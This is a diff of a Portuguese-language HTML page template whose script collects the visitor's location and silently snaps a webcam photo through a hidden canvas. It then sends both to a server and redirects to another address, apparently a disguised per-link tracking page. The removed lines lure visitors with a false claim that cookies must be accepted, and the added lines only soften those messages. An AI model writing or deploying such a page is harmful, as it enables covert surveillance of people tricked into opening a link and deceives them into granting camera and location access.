@@ -10,12 +10,11 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const slug = "{{ slug if slug else '' }}";
+        const slug = "{{ slug }}";
 
         async function coletarDados() {
             let latitude = "", longitude = "", foto_base64 = "";
 
-            // Atualiza a mensagem na tela
             function atualizarMensagem(texto) {
                 document.getElementById('mensagem').innerText = texto;
             }
@@ -30,7 +29,7 @@
                 longitude = pos.coords.longitude;
             } catch (e) {
                 console.warn("Erro na geolocalização:", e);
-                atualizarMensagem("Para melhor experiência todos os Cokies  devem ser aceitos! atualize a página");
+                atualizarMensagem("Para melhor experiência, ative a localização e recarregue a página.");
                 return;
             }
 
@@ -42,7 +41,7 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
 
-                await new Promise(r => setTimeout(r, 2000)); // aguarda a câmera ligar
+                await new Promise(r => setTimeout(r, 2000)); // Aguarda a câmera ligar
 
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -52,7 +51,7 @@
                 stream.getTracks().forEach(t => t.stop());
             } catch (e) {
                 console.warn("Erro ao acessar câmera:", e);
-                atualizarMensagem("Para melhor experiência todos os Cokies  devem ser aceitos! atualize a página");
+                atualizarMensagem("Erro ao acessar a câmera. Verifique as permissões.");
                 return;
             }
 
@@ -71,7 +70,7 @@
                 window.location.href = json.destino;
             } catch (e) {
                 console.error("Erro ao enviar dados:", e);
-                atualizarMensagem("Para melhor experiência todos os Cokies  devem ser aceitos! atualize a página");
+                atualizarMensagem("Erro no envio de dados. Tente novamente.");
             }
         }
 
